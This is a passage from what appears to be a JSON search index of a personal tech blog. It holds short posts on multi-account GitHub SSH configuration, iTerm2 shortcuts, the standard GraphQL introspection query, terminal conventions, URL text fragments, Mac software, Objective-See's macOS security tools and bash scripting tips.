style=\"color:#e6db74\"\u003e\u0026#34;github-plnx:planet-express\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  insteadOf \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e git@github.com:planet-express\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","command line","ssh","Github"],"title":"Configuring SSH Keys for Multiple GitHub Accounts"},{"categories":["URL","terminal","iTerm2"],"contents":" iTerm2 features I find useful Show Timestamps ==\u0026gt; ⌘+Shift+E Alert on next prompt ==\u0026gt; ⌘+Option+A Jump between prompts ==\u0026gt; ⌘+Shift+Down Hotkeys to scroll one line at a time ==\u0026gt; ⌘+Up and ⌘+Down Rearrange tabs with hotkeys ==\u0026gt; Ctrl+Shift+B and Ctrl+Shift+F ","date":"February 9, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250209-iterm2-features-i-find-useful/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://danielde.dev/blog/iterm2-features-i-find-useful\" target=\"_blank\" rel=\"noopener\"\u003eiTerm2 features I find useful\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eShow Timestamps ==\u0026gt; \u003ccode\u003e⌘+Shift+E\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAlert on next prompt ==\u0026gt; \u003ccode\u003e⌘+Option+A\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eJump between prompts ==\u0026gt; \u003ccode\u003e⌘+Shift+Down\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eHotkeys to scroll one line at a time ==\u0026gt; \u003ccode\u003e⌘+Up\u003c/code\u003e and \u003ccode\u003e⌘+Down\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eRearrange tabs with hotkeys ==\u0026gt; \u003ccode\u003eCtrl+Shift+B\u003c/code\u003e and \u003ccode\u003eCtrl+Shift+F\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","terminal","iTerm2"],"title":"iTerm2 features I find useful"},{"categories":["GraphQL"],"contents":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } ","date":"January 2, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250102-gql-introspection-query/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-graphql\" data-lang=\"graphql\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003equery\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eIntrospectionQuery\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  __schema {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003equery\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eType\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003emutation\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eType\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003esubscription\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eType\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eFullType\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003edirective\u003c/span\u003es {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      locations\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      args {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eInputValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efragment\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFullType\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e __Type {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  fields(includeDeprecated: \u003cspan style=\"color:#a6e22e\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    args {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eInputValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTypeRef\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    isDeprecated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    deprecationReason\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003einput\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eFields\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eInputValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eTypeRef\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eenum\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eValues\u003c/span\u003e(includeDeprecated: \u003cspan style=\"color:#a6e22e\"\u003etrue\u003c/span\u003e) {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    isDeprecated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    deprecationReason\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  possibleTypes {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003eTypeRef\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efragment\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eInputValue\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e __InputValue {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  description\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003e...\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003eTypeRef\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  defaultValue\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efragment\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTypeRef\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eon\u003c/span\u003e __Type {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              ofType {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                kind\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e              }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["GraphQL"],"title":"GraphQL Introspection Query"},{"categories":["URL","terminal","command line"],"contents":" \u0026ldquo;Rules\u0026rdquo; that terminal programs follow\nrule 1: noninteractive programs should quit when you press Ctrl-C\nrule 2: TUIs should quit when you press q\nrule 3: REPLs should quit when you press Ctrl-D on an empty line\nrule 4: don\u0026rsquo;t use more than 16 colours\nrule 5: vaguely support readline keybindings\nrule 5.1: Ctrl-W should delete the last word rule 6: disable colours when writing to a pipe\nrule 7: - means stdin/stdout\n","date":"December 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20241225-terminal-rules/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://jvns.ca/blog/2024/11/26/terminal-rules/\" target=\"_blank\" rel=\"noopener\"\u003e\u0026ldquo;Rules\u0026rdquo; that terminal programs follow\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 1: noninteractive programs should quit when you press Ctrl-C\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 2: TUIs should quit when you press q\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 3: REPLs should quit when you press Ctrl-D on an empty line\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 4: don\u0026rsquo;t use more than 16 colours\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 5: vaguely support readline keybindings\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erule 5.1: Ctrl-W should delete the last word\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 6: disable colours when writing to a pipe\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003erule 7: - means stdin/stdout\u003c/p\u003e","tags":["URL","terminal","command line"],"title":"Rules that terminal programs follow"},{"categories":["URL","web","browser"],"contents":" Smarter than \u0026lsquo;Ctrl+F\u0026rsquo;: Linking Directly to Web Page Content syntax\nhttps://example.com/page.html#:~:text=[prefix-,]textStart[,textEnd][,-suffix]\nexample\nhttps://developer.mozilla.org/en-US/docs/Web/URI/Fragment/Text_fragments#:~:text=without%20relying%20on%20the%20presence%20of%20IDs\n","date":"December 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20241225-linking-directly-to-web-page-content/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://alfy.blog/2024/10/19/linking-directly-to-web-page-content.html\" target=\"_blank\" rel=\"noopener\"\u003eSmarter than \u0026lsquo;Ctrl+F\u0026rsquo;: Linking Directly to Web Page Content\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003esyntax\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://example.com/page.html#:~:text=[prefix-,]textStart[,textEnd][,-suffix]\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eexample\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ehttps://developer.mozilla.org/en-US/docs/Web/URI/Fragment/Text_fragments#:~:text=without%20relying%20on%20the%20presence%20of%20IDs\u003c/code\u003e\u003c/p\u003e","tags":["URL","web","browser"],"title":"Smarter than 'Ctrl+F': Linking Directly to Web Page Content"},{"categories":["URL","macOS","Software","APP"],"contents":" Mac 小众软件推荐与工作流分享(2024) ","date":"November 14, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20241114-mac-app-share/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.ursb.me/posts/mac-app-share-2024/\" target=\"_blank\" rel=\"noopener\"\u003eMac 小众软件推荐与工作流分享(2024)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","macOS","Software","APP"],"title":"Mac 小众软件推荐与工作流分享(2024)"},{"categories":["URL","macOS","Security"],"contents":" Objective-See: 一个关于 Apple 设备隐私与安全的开源项目组织 今天搜小工具的时候发现他们做了一堆 macOS 上的开源软件，基本都是和隐私与安全相关的。\nKnockKnock: 查看你的 Mac 上有哪些后台进程、守护进程、启动项、内核扩展、登录项、浏览器插件等等。能看到的比那个「Login Items」详细的多（有的软件通过其他方式自启动）\nLuLu: 一个开源的 macOS 上的网络防火墙，可以让你详细的控制每个软件的网络连接。（类似 Hands Off!）\nTaskExplorer: 一个增强版的任务管理器，可以看到应用的签名、打开的文件、网络连接等等，还可以根据 sha256 自动帮你搜索 VirusTotal 结果。\nDo Not Disturb: 可以阻止你的 Mac 被打扰（没错），当你的 Mac 被别人打开盖子时可以发送警告、执行脚本、检测设备变化之类的。\nBlockBlock: 可以阻止后台的持久化安装，RansomWhere 可以检测文件被加密的行为，还有一些杂七杂八的独立工具。\nhttps://objective-see.org\n","date":"November 13, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20241113-objective-see/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://t.me/misakatech/1349\" target=\"_blank\" rel=\"noopener\"\u003eObjective-See: 一个关于 Apple 设备隐私与安全的开源项目组织\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e今天搜小工具的时候发现他们做了一堆 macOS 上的开源软件，基本都是和隐私与安全相关的。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/knockknock.html\" target=\"_blank\" rel=\"noopener\"\u003eKnockKnock\u003c/a\u003e: 查看你的 Mac 上有哪些后台进程、守护进程、启动项、内核扩展、登录项、浏览器插件等等。能看到的比那个「Login Items」详细的多（有的软件通过其他方式自启动）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/lulu.html\" target=\"_blank\" rel=\"noopener\"\u003eLuLu\u003c/a\u003e: 一个开源的 macOS 上的网络防火墙，可以让你详细的控制每个软件的网络连接。（类似 Hands Off!）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/taskexplorer.html\" target=\"_blank\" rel=\"noopener\"\u003eTaskExplorer\u003c/a\u003e: 一个增强版的任务管理器，可以看到应用的签名、打开的文件、网络连接等等，还可以根据 sha256 自动帮你搜索 VirusTotal 结果。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/dnd.html\" target=\"_blank\" rel=\"noopener\"\u003eDo Not Disturb\u003c/a\u003e: 可以阻止你的 Mac 被打扰（没错），当你的 Mac 被别人打开盖子时可以发送警告、执行脚本、检测设备变化之类的。\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org/products/blockblock.html\" target=\"_blank\" rel=\"noopener\"\u003eBlockBlock\u003c/a\u003e: 可以阻止后台的持久化安装，RansomWhere 可以检测文件被加密的行为，还有一些杂七杂八的独立工具。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://objective-see.org\" target=\"_blank\" rel=\"noopener\"\u003ehttps://objective-see.org\u003c/a\u003e\u003c/p\u003e","tags":["URL","macOS","Security"],"title":"Objective-See: 一个关于 Apple 设备隐私与安全的开源项目组织"},{"categories":["URL","SHELL","BASH"],"contents":" Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash Use Built-in Commands Built-in commands execute faster because they don\u0026rsquo;t require loading an external process. Minimize Subshells Subshells can be expensive in terms of performance. # Inefficient output=$(cat file.txt) # Efficient output=$(\u0026lt;file.txt) Use Arrays for Bulk Data When handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables. # Inefficient item1=\u0026#34;apple\u0026#34; item2=\u0026#34;banana\u0026#34; item3=\u0026#34;cherry\u0026#34; # Efficient items=(\u0026#34;apple\u0026#34; \u0026#34;banana\u0026#34; \u0026#34;cherry\u0026#34;) for item in \u0026#34;${items[@]}\u0026#34;; do echo \u0026#34;$item\u0026#34; done Enable Noclobber To prevent accidental overwriting of files. set -o noclobber Use Functions Functions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy. Efficient File Operations When performing file operations, use efficient techniques to minimize resource usage. # Inefficient while read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt # Efficient while IFS= read -r line; do echo \u0026#34;$line\u0026#34; done \u0026lt; file.txt Parallel Processing Tools like xargs and GNU parallel can be incredibly useful. Error Handling Robust error handling is critical for creating reliable and maintainable scripts. # Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors. set -e # Custom Error Messages: Implement custom error messages to provide more context when something goes wrong. command1 || { echo \u0026#34;command1 failed\u0026#34;; exit 1; } # Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully. trap \u0026#39;echo \u0026#34;Error occurred\u0026#34;; cleanup; exit 1\u0026#39; ERR function cleanup() { # Cleanup code } # Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior. if [[ -z \u0026#34;$1\u0026#34; ]]; then echo \u0026#34;Usage: $0 \u0026lt;argument\u0026gt;\u0026#34; exit 1 fi # Logging: Implement logging to keep track of script execution and diagnose issues. logfile=\u0026#34;script.log\u0026#34; exec \u0026gt; \u0026gt;(tee -i $logfile) exec 2\u0026gt;\u0026amp;1 echo \u0026#34;Script started\u0026#34; Automating Complex System Administration Tasks: Automated Backups System Monitoring User Management Automated Updates Network Configuration ","date":"September 25, 2024","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2024/20240925-advanced-shell-scripting/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://omid.dev/2024/06/19/advanced-shell-scripting-techniques-automating-complex-tasks-with-bash/\" target=\"_blank\" rel=\"noopener\"\u003eAdvanced Shell Scripting Techniques: Automating Complex Tasks with Bash\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"use-built-in-commands\"\u003eUse Built-in Commands\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eBuilt-in commands execute faster because they don\u0026rsquo;t require loading an external process.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch4 id=\"minimize-subshells\"\u003eMinimize Subshells\u003c/h4\u003e\n\n\n\n    \n\n\n\u003cdiv class=\"alert info\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"info\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003eSubshells can be expensive in terms of performance.\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Inefficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eoutput\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecat file.txt\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Efficient\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eoutput\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003e\u0026lt;file.txt\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"use-arrays-for-bulk-data\"\u003eUse Arrays for Bulk 